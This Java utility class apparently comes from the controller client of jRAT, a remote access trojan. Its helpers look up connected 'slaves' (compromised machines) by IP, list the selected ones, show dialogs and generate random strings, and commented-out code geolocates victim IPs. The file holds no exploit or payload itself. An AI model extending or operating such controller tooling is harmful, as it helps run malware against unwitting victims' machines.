package io.jrat.client.utils;

import io.jrat.client.Main;
import io.jrat.client.Slave;
import io.jrat.client.ui.frames.Frame;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Random;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableModel;


public class Utils {

	public static HashMap<String, ImageIcon> pingicons = new HashMap<String, ImageIcon>();

	// public static IP2Country ip2c;

	public static int getRow(int column, String value) {
		for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
			if (Frame.mainModel.getValueAt(i, column).equals(value)) {
				return i;
			}
		}
		return -1;
	}

	public static Slave getSlave(String ip) {
		for (int i = 0; i < Main.connections.size(); i++) {
			if (Main.connections.get(i).getIP().equals(ip)) {
				return Main.connections.get(i);
			}
		}
		return null;
	}

	public static List<Slave> getSlaves() {
		try {
			List<Slave> list = new ArrayList<Slave>();
			for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
				Slave slave = getSlave(Frame.mainModel.getValueAt(i, 3).toString());
				boolean selected = false;
				for (int row : Frame.mainTable.getSelectedRows()) {
					if (row == i) {
						selected = true;
						break;
					}
				}
				if (slave.isSelected() || selected) {
					list.add(slave);
				}
			}
			return list;
		} catch (Exception ex) {
			ex.printStackTrace();
			return null;
		}
	}

	public static String showDialog(String title, String text) {
		return JOptionPane.showInputDialog(null, text, title, JOptionPane.QUESTION_MESSAGE);
	}

	/*
	 * public static ImageIcon getCountry(String ip) { if (Slave.shouldFix(ip))
	 * { ip = Slave.fix(ip); }
	 * 
	 * ImageIcon icon = null; Country c = null;
	 * 
	 * try { if (ip2c == null) { ip2c = new
	 * IP2Country(IP2Country.MEMORY_MAPPED); } c = ip2c.getCountry(ip); if (c ==
	 * null) { if (flags.containsKey("unknown")) { icon = flags.get("unknown");
	 * } else { icon = new
	 * ImageIcon(Main.class.getResource("/icons/unknown.png")); } } else { if
	 * (flags.containsKey(c.get2cStr().toLowerCase())) { icon =
	 * flags.get(c.get2cStr().toLowerCase()); } else { icon = new
	 * ImageIcon(Main.class.getResource("/flags/" + c.get2cStr().toLowerCase() +
	 * ".png")); } } } catch (Exception e) { e.printStackTrace(); icon = new
	 * ImageIcon(Main.class.getResource("/icons/unknown.png")); }
	 * 
	 * if (!flags.containsKey(icon.toString().toLowerCase())) {
	 * flags.put(icon.toString().toLowerCase(), icon); } else if (c != null &&
	 * !flags.containsKey(c.get2cStr().toLowerCase())) {
	 * flags.put(c.get2cStr().toLowerCase(), icon); } return icon; }
	 */

	/*
	 * public static ImageIcon getCountry(Slave slave) { ImageIcon icon = null;
	 * try {
	 * 
	 * if (flags.containsKey(slave.getCountry())) { icon =
	 * flags.get(slave.getCountry()); } else { icon = new
	 * ImageIcon(Main.class.getResource("/flags/" + slave.getCountry() +
	 * ".png")); }
	 * 
	 * } catch (Exception e) { e.printStackTrace(); icon = new
	 * ImageIcon(Main.class.getResource("/icons/unknown.png")); }
	 * 
	 * if (!flags.containsKey(icon.toString().toLowerCase())) {
	 * flags.put(icon.toString().toLowerCase(), icon); } return icon; }
	 */

	/*
	 * public static Country getCountryClass(String ip) { if
	 * (Slave.shouldFix(ip)) { ip = Slave.fix(ip); } try { if (ip2c == null) {
	 * ip2c = new IP2Country(IP2Country.MEMORY_MAPPED); } Country c =
	 * ip2c.getCountry(ip); return c; } catch (Exception e) {
	 * e.printStackTrace(); } return null; }
	 */

	public static boolean yesNo(String title, String message) {
		return JOptionPane.showConfirmDialog(null, message, title, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION;
	}

	public static String[] getFiles(int[] rows, DefaultTableModel model) {
		String[] str = new String[rows.length];
		for (int i = 0; i < rows.length; i++) {
			int row = rows[i];
			str[i] = model.getValueAt(row, 0).toString();
		}
		return str;
	}

	public static int getRow(Slave slave) {
		for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
			if (Frame.mainModel.getValueAt(i, 3).equals(slave.getIP())) {
				return i;
			}
		}
		return -1;
	}

	public static void center(JFrame window) {
		int widthWindow = window.getWidth();
		int heightWindow = window.getHeight();
		Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
		int X = (screen.width / 2) - (widthWindow / 2);
		int Y = (screen.height / 2) - (heightWindow / 2);

		window.setBounds(X, Y, widthWindow, heightWindow);
	}

	public static String getDate() {
		Date now = new Date();
		return DateFormat.getTimeInstance(DateFormat.MEDIUM).format(now);
	}

	public static String randomString() {
		return randomString(10);
	}

	public static String randomString(int len) {
		String a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

		String str = "";

		Random rand = new Random();

		for (int i = 0; i < len; i++) {
			str += a.charAt(rand.nextInt(a.length()));
		}

		return str;
	}

}
